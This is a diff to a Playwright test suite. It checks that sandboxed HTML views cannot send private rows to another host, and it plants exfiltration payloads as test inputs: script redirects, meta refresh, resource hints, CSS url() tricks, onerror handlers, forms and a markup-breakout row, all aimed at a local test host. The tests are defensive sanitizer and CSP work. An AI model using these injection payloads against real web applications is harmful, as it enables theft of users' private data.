@@ -1,7 +1,7 @@
 import { createSocket } from "node:dgram";
 import { createServer } from "node:http";
 import type { AddressInfo } from "node:net";
-import type { Page } from "@playwright/test";
+import type { Locator, Page } from "@playwright/test";
 import { expect, test } from "./test";
 import {
   apiOrigin,
@@ -26,8 +26,6 @@ const WEBRTC_WAIT_MS = 3_000;
 
 const refusedByShell =
   /^Framing '[^']*' violates the following Content Security Policy directive: "frame-src 'none'"\./u;
-const refusedBySandbox =
-  /^Refused to execute the redirect specified via '<meta http-equiv='refresh'/u;
 
 interface OtherHost {
   origin: string;
@@ -111,19 +109,22 @@ interface Exit {
   name: string;
   /** What the view holds to get to `address`. */
   html(address: string): string;
-  /** The exit needs the person to click the link with the id `go`. */
-  click?: true;
 }
 
-const link = (attributes: string) => (address: string) =>
-  `<a id="go" ${attributes} href="${address}">Open</a>`;
 const script = (body: (address: string) => string) => (address: string) =>
   `<script>${body(JSON.stringify(address))}</script>`;
 
-const scriptedExits: Exit[] = [
+// Ways a view moves its own frame. The shell refuses each of them. The links are clicked
+// outside the document, where the view's own bootstrap neither sees nor cancels them: this is
+// what a script does that wants to get past that bootstrap.
+const frameExits: Exit[] = [
   { name: "location.href", html: script((address) => `location.href=${address}`) },
   { name: "location.assign", html: script((address) => `location.assign(${address})`) },
   { name: "location.replace", html: script((address) => `location.replace(${address})`) },
+  {
+    name: "a meta refresh in its document",
+    html: (address) => `<meta http-equiv="refresh" content="0;url=${address}">`
+  },
   {
     name: "a meta refresh a script adds",
     html: script(
@@ -132,29 +133,19 @@ const scriptedExits: Exit[] = [
     )
   },
   {
-    name: "a link a script clicks",
+    name: "a link a script clicks outside its document",
+    html: script(
+      (address) => `var link=document.createElement("a");link.href=${address};link.click()`
+    )
+  },
+  {
+    name: "a download link a script clicks outside its document",
     html: script(
       (address) =>
-        `var link=document.createElement("a");link.href=${address};document.body.appendChild(link);link.click()`
+        `var link=document.createElement("a");link.href=${address};link.download="rows";link.click()`
     )
   }
 ];
-const metaRefresh: Exit = {
-  name: "a meta refresh in its document",
-  html: (address) => `<meta http-equiv="refresh" content="0;url=${address}">`
-};
-const clickedExits: Exit[] = [
-  { name: "a link the user clicks", html: link(""), click: true },
-  { name: "a download link the user clicks", html: link("download"), click: true }
-];
-
-async function tryExit(page: Page, kind: ViewKind, exit: Exit, address: string): Promise<void> {
-  await openView(page, kind, exit.html(address));
-  if (exit.click) {
-    await expect(page.getByText("Loading view…")).toHaveCount(0);
-    await viewFrame(page).locator("#go").click();
-  }
-}
 
 /** The browser said it refused, and after a while the other host has still seen nothing. */
 async function expectRefused(
@@ -165,6 +156,52 @@ async function expectRefused(
 ): Promise<void> {
   await expect.poll(() => refusals.filter((text) => refusal.test(text))).toHaveLength(1);
   await page.waitForTimeout(SETTLE_MS);
+  expect(otherHost.requests).toEqual([]);
+  expect(otherHost.connections).toBe(0);
+}
+
+// A click with a modifier key or the middle button does not move the frame. It opens the
+// address in a new tab or window, or downloads it, and the shell has no say in that. So a
+// link in a view has no address: these tests click one in every way and count.
+
+interface LinkClick {
+  name: string;
+  attributes?: string;
+  options?: Parameters<Locator["click"]>[0];
+}
+
+const linkClicks: LinkClick[] = [
+  { name: "a click on a link" },
+  { name: "a click on a download link", attributes: "download" },
+  // The key that opens a link in a new tab: Meta on macOS, Control elsewhere.
+  { name: "a Control or Meta click on a link", options: { modifiers: ["ControlOrMeta"] } },
+  { name: "a Shift click on a link", options: { modifiers: ["Shift"] } },
+  { name: "an Alt click on a link", options: { modifiers: ["Alt"] } },
+  { name: "a middle click on a link", options: { button: "middle" } }
+];
+
+/** Shows a view with one link to the other host, clicks it, and counts what left. */
+async function expectClickReachesNothing(
+  page: Page,
+  kind: ViewKind,
+  click: LinkClick,
+  otherHost: OtherHost
+): Promise<void> {
+  const opened: string[] = [];
+  page.context().on("page", (popup) => opened.push(popup.url()));
+  page.on("download", (download) => opened.push(download.url()));
+  const address = `${otherHost.origin}/hit?click=${encodeURIComponent(click.name)}&rows=secret`;
+
+  await openView(page, kind, `<a id="go" ${click.attributes ?? ""} href="${address}">Open</a>`);
+  await expect(page.getByText("Loading view…")).toHaveCount(0);
+  const link = viewFrame(page).locator("#go");
+  // The link is there to be clicked, as text. Its address is gone.
+  await expect(link).toHaveText("Open");
+  await expect(link).not.toHaveAttribute("href");
+  await link.click(click.options);
+
+  await page.waitForTimeout(SETTLE_MS);
+  expect(opened).toEqual([]);
   expect(otherHost.requests).toEqual([]);
   expect(otherHost.connections).toBe(0);
 }
@@ -181,34 +218,15 @@ exitTest.describe("a view cannot move its frame to another host", () => {
     expect(otherHost.connections).toBeGreaterThan(0);
   });
 
-  for (const exit of [...scriptedExits, metaRefresh, ...clickedExits]) {
+  for (const exit of frameExits) {
     exitTest(
       `a view cannot leave its frame through ${exit.name}`,
       async ({ page, otherHost, refusals }) => {
         const address = `${otherHost.origin}/hit?exit=${encodeURIComponent(exit.name)}&rows=secret`;
 
-        await tryExit(page, "html.rendered", exit, address);
+        await openView(page, "html.rendered", exit.html(address));
 
         await expectRefused(page, otherHost, refusals, refusedByShell);
-      }
-    );
-  }
-
-  for (const exit of [metaRefresh, ...clickedExits]) {
-    exitTest(
-      `a view with private rows cannot leave its frame through ${exit.name}`,
-      async ({ page, otherHost, refusals }) => {
-        const address = `${otherHost.origin}/hit?exit=${encodeURIComponent(exit.name)}&rows=secret`;
-
-        await tryExit(page, "private_hydrated_view", exit, address);
-
-        // Without scripts the sandbox already refuses a refresh; the shell refuses the links.
-        await expectRefused(
-          page,
-          otherHost,
-          refusals,
-          exit === metaRefresh ? refusedBySandbox : refusedByShell
-        );
       }
     );
   }
@@ -233,6 +251,136 @@ exitTest.describe("a view cannot move its frame to another host", () => {
       // `frame-src 'none'` names no address at all: a view can navigate nowhere.
       await expectRefused(page, otherHost, refusals, refusedByShell);
       expect(asked).toEqual([]);
+    }
+  );
+});
+
+exitTest.describe("a link in a view has no address", () => {
+  exitTest.setTimeout(60_000);
+
+  for (const click of linkClicks) {
+    exitTest(`a view reaches no other host through ${click.name}`, async ({ page, otherHost }) => {
+      await expectClickReachesNothing(page, "html.rendered", click, otherHost);
+    });
+
+    exitTest(
+      `a view with private rows reaches no other host through ${click.name}`,
+      async ({ page, otherHost }) => {
+        await expectClickReachesNothing(page, "private_hydrated_view", click, otherHost);
+      }
+    );
+  }
+});
+
+// A view that holds private rows runs no script and needs none to send rows away: they are
+// written into its HTML on the server. Its body is therefore written anew from an allowlist
+// when it is shown. These tests read the document the frame was given.
+
+/** The document the shell gave the frame of the view. */
+async function composedDocument(page: Page): Promise<string> {
+  await expect(page.getByText("Loading view…")).toHaveCount(0);
+  const frame = page.locator(`iframe[title="${viewTitle}"]`).first().contentFrame();
+  return (await frame.locator("iframe").getAttribute("srcdoc")) ?? "";
+}
+
+exitTest.describe("a view with private rows is written from an allowlist", () => {
+  exitTest.setTimeout(60_000);
+
+  exitTest("it keeps nothing that names a host", async ({ page, otherHost }) => {
+    const there = otherHost.origin;
+    const host = new URL(there).host;
+    const planted = [
+      // Resource hints: the browser may look the host up without asking the content policy.
+      `<link rel="dns-prefetch" href="//${host}">`,
+      `<link rel="preconnect" href="${there}">`,
+      `<link rel="prefetch" href="${there}/hit?hint=prefetch">`,
+      `<link rel="stylesheet" href="${there}/hit?hint=stylesheet">`,
+      '<meta http-equiv="x-dns-prefetch-control" content="on">',
+      `<meta http-equiv="refresh" content="0;url=${there}/hit?exit=refresh">`,
+      `<base href="${there}/">`,
+      // Addresses a person can open, and elements that load one.
+      `<a id="plain" href="${there}/hit?a=1" ping="${there}/hit?ping=1" target="_blank">Link</a>`,
+      `<a id="fragment" href="#rows">Rows</a>`,
+      `<map name="m"><area shape="rect" coords="0,0,9,9" href="${there}/hit?area=1"></map>`,
+      `<form action="${there}/hit"><input name="rows" value="secret"><button formaction="${there}/hit?f=1">Send</button></form>`,
+      `<iframe src="${there}/hit?frame=1"></iframe>`,
+      `<iframe srcdoc="&lt;a href='${there}/hit?nested=1'&gt;x&lt;/a&gt;"></iframe>`,
+      `<object data="${there}/hit?object=1"></object><embed src="${there}/hit?embed=1">`,
+      `<img id="outside" alt="outside" src="${there}/hit?img=1">`,
+      `<img id="set" alt="set" srcset="${there}/hit?srcset=1 1x">`,
+      `<svg id="drawing" width="20" height="20"><a href="${there}/hit?svg=1"><rect width="9" height="9"/></a><image href="${there}/hit?image=1"/><use href="${there}/hit?use=1#x"/><circle id="dot" cx="5" cy="5" r="4" fill="url(${there}/hit?fill=1)"/></svg>`,
+      `<style>@import url("${there}/hit?import=1");</style>`,
+      `<style>p{background:url(${there}/hit?css=1)}</style>`,
+      `<style>p{background:u\\72l(${there}/hit?escaped=1)}</style>`,
+      `<p id="styled" style="background:url('${there}/hit?style=1')" onclick="location.href='${there}'">Styled</p>`,
+      `<script>document.body.setAttribute("data-ran","true")</script>`,
+      // What a static view is made of stays.
+      "<style>#kept{color:rgb(1, 2, 3)}</style>",
+      '<table><tr><th scope="col">Status</th></tr><tr><td id="kept" colspan="1" style="font-weight:700">open</td></tr></table>',
+      '<img id="inline" alt="inline" width="1" height="1" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">'
+    ].join("");
+
+    await openView(page, "private_hydrated_view", planted);
+    const composed = await composedDocument(page);
+    const view = viewFrame(page);
+
+    // No address of the other host is anywhere in the document, in any spelling.
+    expect(composed).not.toContain(host);
+    expect(composed).not.toContain("@import");
+    await expect(
+      view.locator(
+        "link, base, area, map, form, input, button, iframe, object, embed, script, image, use, [href], [ping], [target], [srcset], [onclick]"
+      )
+    ).toHaveCount(0);
+    // The only meta elements are the three the composer writes: policy, charset, viewport.
+    await expect(view.locator("meta")).toHaveCount(3);
+    await expect(view.locator("meta[http-equiv]")).toHaveAttribute(
+      "http-equiv",
+      "Content-Security-Policy"
+    );
+    for (const id of ["outside", "set", "styled", "dot"]) {
+      await expect(view.locator(`#${id}`)).toHaveCount(1);
+    }
+    await expect(view.locator("#outside")).not.toHaveAttribute("src");
+    await expect(view.locator("#styled")).not.toHaveAttribute("style");
+    await expect(view.locator("#dot")).not.toHaveAttribute("fill");
+    await expect(view.locator("#plain")).toHaveText("Link");
+    await expect(view.locator("#fragment")).toHaveText("Rows");
+    // The table, its style block, its inline style and the embedded image are as written.
+    await expect(view.locator("#kept")).toHaveText("open");
+    await expect(view.locator("#kept")).toHaveCSS("color", "rgb(1, 2, 3)");
+    await expect(view.locator("#kept")).toHaveCSS("font-weight", "700");
+    await expect(view.locator("#inline")).toHaveAttribute("src", /^data:image\/gif/u);
+    await expect(view.locator("body")).not.toHaveAttribute("data-ran");
+
+    await page.waitForTimeout(SETTLE_MS);
+    expect(otherHost.requests).toEqual([]);
+    expect(otherHost.connections).toBe(0);
+  });
+
+  exitTest(
+    "it shows row text that is markup as it stands on the allowlist, or not at all",
+    async ({ page, otherHost }) => {
+      const there = otherHost.origin;
+      const host = new URL(there).host;
+      // What a template with a placeholder in markup used to become: the row closes the element
+      // it was placed in and goes on as markup of its own.
+      const row = `</pre><link rel="dns-prefetch" href="//${host}"><a id="row-link" href="${there}/hit?rows=secret">Details</a><img id="row-image" src="${there}/hit?img=1" onerror="location.href='${there}'"><b id="row-bold">bold</b>`;
+
+      await openView(page, "private_hydrated_view", `<pre id="rows">[{"note":"${row}"}]</pre>`);
+      const composed = await composedDocument(page);
+      const view = viewFrame(page);
+
+      expect(composed).not.toContain(host);
+      await expect(view.locator("link, [href], [onerror], [src]")).toHaveCount(0);
+      // Formatting a row brings along is on the list and stays; it carries no address.
+      await expect(view.locator("#row-link")).toHaveText("Details");
+      await expect(view.locator("#row-bold")).toHaveText("bold");
+      await view.locator("#row-link").click({ modifiers: ["ControlOrMeta"] });
+
+      await page.waitForTimeout(SETTLE_MS);
+      expect(otherHost.requests).toEqual([]);
+      expect(otherHost.connections).toBe(0);
     }
   );
 });
